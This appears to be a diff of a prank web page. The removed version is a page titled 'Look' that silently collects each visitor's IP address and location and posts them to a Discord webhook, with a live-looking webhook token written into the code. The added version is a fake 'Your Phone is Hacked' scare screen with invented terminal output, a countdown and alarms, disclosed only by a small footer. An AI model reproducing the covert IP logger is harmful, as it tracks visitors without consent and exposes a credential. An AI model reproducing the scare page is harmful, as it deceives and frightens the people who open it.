@@ -1,63 +1,531 @@
 <!doctype html>
-<html lang="en">
+<html lang="tr">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Look</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>⚠️ Your Phone is Hacked</title>
 <style>
-body { 
-  display:flex; 
-  justify-content:center; 
-  align-items:center; 
-  height:100vh; 
-  margin:0; 
-  background:#0f1720; 
-  color:#facc15; 
-  font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; 
-  font-size:32px; 
-  font-weight:bold; 
-}
+  :root{
+    --bg:#020202;
+    --red:#ff1f1f;
+    --darkred:#8f0b0b;
+    --cyan:#00e5ff;
+    --mono: ui-monospace, SFMono-Regular, "Roboto Mono", "Courier New", monospace;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    background: linear-gradient(180deg,#000 0%, #060606 60%);
+    color:var(--red);
+    font-family:var(--mono);
+    overflow:hidden;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  /* Main layout */
+  .stage{
+    width:100%;
+    height:100%;
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+  }
+  .panel{
+    width:min(980px,96vw);
+    height:min(720px,92vh);
+    background:linear-gradient(180deg, rgba(0,0,0,0.55), rgba(0,0,0,0.75));
+    border:1px solid rgba(255,0,0,0.06);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.7), inset 0 0 120px rgba(255,0,0,0.02);
+    border-radius:12px;
+    overflow:hidden;
+    position:relative;
+    padding:22px;
+    display:grid;
+    grid-template-rows: auto 1fr auto;
+    gap:12px;
+  }
+
+  header{
+    display:flex;
+    align-items:center;
+    gap:12px;
+  }
+  .dot{width:12px;height:12px;border-radius:50%;}
+  .dot.red{background:var(--red);box-shadow:0 0 18px #ff3a3a;}
+  .dot.cyan{background:var(--cyan);box-shadow:0 0 18px #6ff;}
+  .title{font-size:clamp(18px,2.2vw,26px); color:var(--red); letter-spacing:1px;}
+  .subtitle{color:#ff7f7f; font-size:12px; opacity:0.9; margin-left:auto}
+
+  /* Big warning */
+  .warning{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:14px;
+    flex-direction:column;
+    text-align:center;
+    padding:8px 12px;
+    user-select:none;
+  }
+  .warning .main{
+    font-size:clamp(28px,5vw,56px);
+    line-height:0.95;
+    font-weight:700;
+    color:var(--red);
+    text-transform:uppercase;
+    position:relative;
+    letter-spacing:2px;
+    animation:glitch 900ms infinite;
+  }
+  @keyframes glitch{
+    0%{transform:none; text-shadow:2px 0 var(--red), -2px 0 var(--cyan);}
+    25%{transform:translateX(-2px) skewX(-1deg); text-shadow:-3px 0 var(--red);}
+    50%{transform:translateX(2px) skewX(1deg); text-shadow:3px 0 var(--cyan);}
+    75%{transform:translateX(-1px) skewX(-0.5deg); text-shadow:-2px 0 var(--red);}
+    100%{transform:none; text-shadow:2px 0 var(--red), -2px 0 var(--cyan);}
+  }
+  .warning .sub{
+    color:#ffbaba;
+    font-size:clamp(12px,1.8vw,16px);
+    opacity:0.95;
+    text-transform:uppercase;
+    letter-spacing:1px;
+  }
+
+  /* Terminal + Right column */
+  .content{
+    display:grid;
+    grid-template-columns: 1fr 360px;
+    gap:12px;
+    height:100%;
+  }
+  .terminal{
+    background:rgba(0,0,0,0.6);
+    border-radius:8px;
+    padding:14px;
+    color:#a8ffb8;
+    font-size:13px;
+    overflow:auto;
+    box-shadow: inset 0 0 40px rgba(0,0,0,0.6);
+    border:1px solid rgba(0,255,150,0.03);
+  }
+  .term-line{white-space:pre-wrap; margin:4px 0; opacity:0.95; font-family:var(--mono)}
+  .term-prefix{color:#66ff99; margin-right:8px}
+  .right{
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+  }
+  .card{
+    background:linear-gradient(180deg, rgba(255,0,0,0.03), rgba(0,0,0,0.35));
+    border-radius:8px;
+    padding:12px;
+    min-height:120px;
+    border:1px solid rgba(255,0,0,0.06);
+  }
+
+  .countdown{
+    font-size:28px;
+    font-weight:700;
+    color: #ffccd0;
+    letter-spacing:2px;
+    text-align:center;
+    margin-top:8px;
+  }
+
+  .controls{
+    display:flex;
+    gap:8px;
+    margin-top:8px;
+    flex-wrap:wrap;
+    justify-content:center;
+  }
+  .btn{
+    background:transparent;
+    border:1px solid rgba(255,255,255,0.07);
+    color:var(--red);
+    padding:8px 12px;
+    border-radius:8px;
+    cursor:pointer;
+    font-family:var(--mono);
+    font-weight:700;
+    text-transform:uppercase;
+    letter-spacing:1px;
+    transition:transform 120ms ease, box-shadow 120ms;
+  }
+  .btn:hover{transform:translateY(-3px); box-shadow:0 10px 30px rgba(255,0,0,0.06)}
+  .btn.primary{
+    background:linear-gradient(90deg,var(--red),var(--darkred));
+    color:white;
+    border:none;
+    box-shadow:0 6px 20px rgba(255,0,0,0.18);
+  }
+
+  /* Scanline and overlay effects */
+  .scanline{
+    position:absolute;
+    left:0; right:0;
+    top:-40%;
+    height:2px;
+    background:linear-gradient(90deg, transparent, rgba(255,0,0,0.14), transparent);
+    transform:skewX(-18deg);
+    filter:blur(0.4px);
+    animation:scan 3s linear infinite;
+    pointer-events:none;
+    mix-blend-mode:screen;
+  }
+  @keyframes scan{
+    0%{top:-30%}
+    100%{top:130%}
+  }
+
+  .overlay-flash{
+    position:absolute;
+    inset:0;
+    background:rgba(255,10,10,0.04);
+    pointer-events:none;
+    mix-blend-mode:screen;
+    opacity:0;
+    transition:opacity 220ms linear;
+  }
+
+  /* Intense mode classes */
+  .intense .warning .main{filter:blur(0.2px) saturate(1.1)}
+  .intense .scanline{animation-duration:0.9s}
+  .intense .panel{box-shadow: 0 40px 90px rgba(255,0,0,0.18)}
+  .intense .overlay-flash{opacity:0.25}
+
+  /* Shake */
+  .shake{
+    animation:shake 300ms linear infinite;
+  }
+  @keyframes shake{
+    0%{transform:translateX(0)}
+    20%{transform:translateX(-6px)}
+    40%{transform:translateX(5px)}
+    60%{transform:translateX(-4px)}
+    80%{transform:translateX(3px)}
+    100%{transform:translateX(0)}
+  }
+
+  /* small footer */
+  footer{font-size:11px;color:#ff8b8b; text-align:center; opacity:0.9; padding:6px 2px}
+
+  /* responsive */
+  @media (max-width:880px){
+    .content{grid-template-columns: 1fr; grid-auto-rows:auto}
+    .right{order:2}
+    .warning .main{font-size:28px}
+  }
 </style>
 </head>
 <body>
-Look
+  <div class="stage" id="stage">
+    <div class="panel" id="panel">
+      <header>
+        <div style="display:flex;gap:8px;align-items:center">
+          <div class="dot red"></div><div class="dot cyan"></div>
+        </div>
+        <div class="title">SECURITY BREACH — REMOTE ACCESS</div>
+        <div class="subtitle" id="deviceName">Device: Android • Unknown</div>
+      </header>
+
+      <div class="warning" aria-hidden="true">
+        <div class="main" id="mainText">⚠ YOUR PHONE IS HACKED ⚠</div>
+        <div class="sub">All personal data accessed — Do not power off</div>
+      </div>
+
+      <div class="content" style="align-items:stretch">
+        <div class="terminal" id="terminal" aria-live="polite" role="log">
+          <!-- terminal lines appended by JS -->
+          <div class="term-line"><span class="term-prefix">[00:00:05]</span> Initializing remote modules...</div>
+        </div>
+
+        <div class="right">
+          <div class="card">
+            <div style="display:flex;justify-content:space-between;align-items:center">
+              <div style="font-weight:800;color: #ffd7d7">System Status</div>
+              <div style="font-size:12px;color:#ff9b9b" id="statusText">CRITICAL</div>
+            </div>
+            <div class="countdown" id="countdown">02:00</div>
+
+            <div class="controls">
+              <button class="btn" id="playAlarm">Play Alarm</button>
+              <button class="btn primary" id="worseBtn">MAKE IT WORSE</button>
+              <button class="btn" id="stopBtn">CALM DOWN</button>
+            </div>
+          </div>
+
+          <div class="card" style="display:flex;flex-direction:column;gap:8px">
+            <div style="font-weight:800;color:#ffd7d7">Quick actions</div>
+            <div style="display:flex;gap:8px;flex-wrap:wrap">
+              <button class="btn" id="fakeUpdate">Fake Update</button>
+              <button class="btn" id="lockScreen">Lock Screen</button>
+              <button class="btn" id="wipeFiles">Purge Files</button>
+            </div>
+            <div style="margin-top:auto;color:#ffbdbd;font-size:12px">Tip: Interact to trigger sound/effects</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="scanline" aria-hidden="true"></div>
+      <div class="overlay-flash" id="overlay"></div>
+
+      <footer>Not a real hack — This is a simulated scare page for UI/visual effect only.</footer>
+    </div>
+  </div>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1406016244850884708/hdg5vxrAv837AK-GgYs6kgSCXiwDnYXxlJ-hzFyygVWJBW_v8c_ZtjOcYP8RuN1mWHax"; // <-- replace
+/*
+  Scary UI simulator.
+  - Terminal lines are faked.
+  - Countdown timer speeds up when "worse" pressed.
+  - Play alarm uses WebAudio on user gesture.
+  - Buttons only modify UI; no dangerous actions.
+*/
 
-// Fetch IP and location
-async function fetchIPInfo() {
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    const data = await res.json();
-    return {
-      ip: data.ip || '',
-      country: data.country_name || '',
-      city: data.city || ''
-    };
-  } catch {
-    return { ip:'', country:'', city:'' };
+const terminal = document.getElementById('terminal');
+const mainText = document.getElementById('mainText');
+const stage = document.getElementById('stage');
+const panel = document.getElementById('panel');
+const overlay = document.getElementById('overlay');
+const countdownEl = document.getElementById('countdown');
+const statusText = document.getElementById('statusText');
+const deviceName = document.getElementById('deviceName');
+
+let lines = [
+  "Remote shell established.",
+  "Enumerating storage... (5/12 partitions)",
+  "Exfiltrating contacts database (encrypted)...",
+  "Brute forcing biometric lock: 23% complete",
+  "Capturing camera feed... active",
+  "Reading SMS and call logs...",
+  "Deploying persistence agent...",
+  "Disabling system updates...",
+  "Escalating privileges to root...",
+  "Wiping system caches...",
+  "Encrypting user documents...",
+  "Live stream available at: hxxp://hidden.stream/abc"
+];
+
+let intervalId = null;
+let termIndex = 0;
+let startTime = Date.now();
+let countdownSeconds = 120; // initial 2:00
+let intense = false;
+let shake = false;
+let audioCtx = null;
+let alarmOsc = null;
+let alarmGain = null;
+let countdownTimerId = null;
+let countdownSpeedMultiplier = 1; // >1 speeds it up
+
+// Helper: append terminal line with timestamp
+function appendLine(text){
+  const t = Math.floor((Date.now()-startTime)/1000);
+  const mm = String(Math.floor(t/60)).padStart(2,'0');
+  const ss = String(t%60).padStart(2,'0');
+  const div = document.createElement('div');
+  div.className = 'term-line';
+  div.innerHTML = `<span class="term-prefix">[${mm}:${ss}]</span> ${text}`;
+  terminal.appendChild(div);
+  terminal.scrollTop = terminal.scrollHeight;
+}
+
+// Fake terminal output loop
+function startTerminal(){
+  intervalId = setInterval(()=>{
+    if(termIndex < lines.length){
+      appendLine(lines[termIndex++]);
+    } else {
+      // sometimes print random hex noise
+      appendLine('-->'+Math.random().toString(16).slice(2,18));
+      termIndex = Math.floor(Math.random()*6) + 6;
+    }
+  }, 1100);
+}
+
+// Countdown logic
+function startCountdown(){
+  if(countdownTimerId) clearInterval(countdownTimerId);
+  countdownTimerId = setInterval(()=>{
+    // decrease according to speed multiplier
+    countdownSeconds -= (0.5 * countdownSpeedMultiplier); // ticks half-second-ish
+    if(countdownSeconds <= 0){
+      countdownSeconds = 0;
+      clearInterval(countdownTimerId);
+      onCountdownFinish();
+    }
+    renderCountdown();
+  }, 500);
+}
+
+function renderCountdown(){
+  const s = Math.max(0, Math.ceil(countdownSeconds));
+  const mm = String(Math.floor(s/60)).padStart(2,'0');
+  const ss = String(s%60).padStart(2,'0');
+  countdownEl.textContent = `${mm}:${ss}`;
+  // visual urgency
+  if(s <= 30) {
+    countdownEl.style.color = '#ffbaba';
+    statusText.textContent = 'IMMINENT';
+    if(!intense) toggleIntense(true);
   }
 }
 
-// Send info to Discord webhook
-async function sendToWebhook(info) {
-  try {
-    await fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: `IP: ${info.ip}\nCountry: ${info.country}\nCity: ${info.city}`
-      })
-    });
-  } catch{}
+// When countdown reaches zero
+function onCountdownFinish(){
+  appendLine('>>> TARGET TIMER EXPIRED — EXECUTING PAYLOAD <<<');
+  mainText.textContent = 'WIPE COMPLETE';
+  mainText.style.color = '#ff7b7b';
+  panel.classList.add('shake');
+  overlay.style.opacity = 0.5;
+  playShortBurst(); // small audio burst
 }
 
-// Main
-(async () => {
-  const info = await fetchIPInfo();
-  sendToWebhook(info);
+// Toggle intense visuals
+function toggleIntense(state){
+  intense = state;
+  if(state){
+    stage.classList.add('intense');
+    panel.classList.add('shake');
+  } else {
+    stage.classList.remove('intense');
+    panel.classList.remove('shake');
+    overlay.style.opacity = 0;
+  }
+}
+
+// audio setup (requires user gesture)
+function initAudio(){
+  if(audioCtx) return;
+  try {
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    alarmOsc = audioCtx.createOscillator();
+    alarmGain = audioCtx.createGain();
+    alarmOsc.type = 'sawtooth';
+    alarmOsc.frequency.setValueAtTime(240, audioCtx.currentTime);
+    alarmGain.gain.value = 0;
+    alarmOsc.connect(alarmGain);
+    alarmGain.connect(audioCtx.destination);
+    alarmOsc.start();
+  } catch(e){
+    console.warn('Audio init failed', e);
+  }
+}
+function playAlarm(){
+  if(!audioCtx) initAudio();
+  if(!alarmGain) return;
+  // ramp up
+  alarmGain.gain.cancelScheduledValues(audioCtx.currentTime);
+  alarmGain.gain.setValueAtTime(0, audioCtx.currentTime);
+  alarmGain.gain.linearRampToValueAtTime(0.25, audioCtx.currentTime + 0.05);
+  alarmOsc.frequency.setValueAtTime(440 * (1 + Math.random()*0.4), audioCtx.currentTime);
+}
+function stopAlarm(){
+  if(!alarmGain) return;
+  alarmGain.gain.cancelScheduledValues(audioCtx.currentTime);
+  alarmGain.gain.linearRampToValueAtTime(0, audioCtx.currentTime + 0.3);
+}
+function playShortBurst(){
+  if(!audioCtx) initAudio();
+  const g = audioCtx.createGain();
+  const o = audioCtx.createOscillator();
+  o.type = 'square';
+  o.frequency.value = 320;
+  o.connect(g);
+  g.connect(audioCtx.destination);
+  g.gain.value = 0;
+  g.gain.linearRampToValueAtTime(0.5, audioCtx.currentTime + 0.01);
+  g.gain.linearRampToValueAtTime(0.0, audioCtx.currentTime + 0.18);
+  o.start();
+  setTimeout(()=>{ o.stop(); g.disconnect(); },220);
+}
+
+// Buttons
+document.getElementById('playAlarm').addEventListener('click', ()=>{
+  initAudio();
+  playAlarm();
+  appendLine('User initiated alarm.');
+  // flash overlay briefly
+  overlay.style.opacity = 0.3;
+  setTimeout(()=>overlay.style.opacity = 0,200);
+});
+
+document.getElementById('worseBtn').addEventListener('click', ()=>{
+  appendLine('AGENT: Escalating attack parameters (user request).');
+  countdownSpeedMultiplier = Math.min(6, countdownSpeedMultiplier + 1.2);
+  // increase tick frequency / effect intensity
+  toggleIntense(true);
+  // make terminal faster
+  clearInterval(intervalId);
+  intervalId = setInterval(()=> {
+    appendLine(lines[Math.floor(Math.random()*lines.length)]);
+  }, Math.max(180, 1100 / countdownSpeedMultiplier));
+  // more frequent audio warble
+  playShortBurst();
+});
+
+document.getElementById('stopBtn').addEventListener('click', ()=>{
+  appendLine('Operator action: Attempting to stabilize UI.');
+  countdownSpeedMultiplier = 1;
+  toggleIntense(false);
+  clearInterval(intervalId);
+  startTerminal();
+  stopAlarm();
+});
+
+document.getElementById('fakeUpdate').addEventListener('click', ()=>{
+  appendLine('System update prompt displayed — user ignored.');
+});
+document.getElementById('lockScreen').addEventListener('click', ()=>{
+  appendLine('Lockscreen overlay deployed (simulated).');
+  // visual lock: temporarily cover main text
+  mainText.textContent = 'DEVICE LOCKED';
+  setTimeout(()=> mainText.textContent = '⚠ YOUR PHONE IS HACKED ⚠', 3000);
+});
+document.getElementById('wipeFiles').addEventListener('click', ()=>{
+  appendLine('Simulated purge: user files marked for deletion.');
+  // speed up countdown significantly
+  countdownSpeedMultiplier = Math.min(12, countdownSpeedMultiplier + 3);
+  renderCountdown();
+});
+
+// Try to detect device name from userAgent (best-effort)
+(function detectDevice(){
+  const ua = navigator.userAgent || navigator.vendor || '';
+  let name = 'Unknown';
+  if(/iphone/i.test(ua)) name = 'iPhone';
+  else if(/ipad/i.test(ua)) name = 'iPad';
+  else if(/android/i.test(ua)) {
+    const match = ua.match(/Android\s+([\d.]+);\s*([^;)\]]+)/i);
+    name = match ? match[2].trim() : 'Android Device';
+  } else if(/windows phone/i.test(ua)) name = 'Windows Phone';
+  else if(/macintosh|mac os x/i.test(ua)) name = 'Mac';
+  deviceName.textContent = `Device: ${name}`;
 })();
+
+// init
+startTerminal();
+startCountdown();
+renderCountdown();
+
+// subtle overlay pulse every few seconds
+setInterval(()=>{
+  overlay.style.opacity = (intense?0.35:0.08);
+  setTimeout(()=> overlay.style.opacity = 0, (intense?220:80));
+}, 2800);
+
+// small random jitter in main text for extra spooky effect
+setInterval(()=>{
+  mainText.style.transform = `translateX(${(Math.random()*6-3).toFixed(2)}px)`;
+}, 650);
+
 </script>
 </body>
 </html>
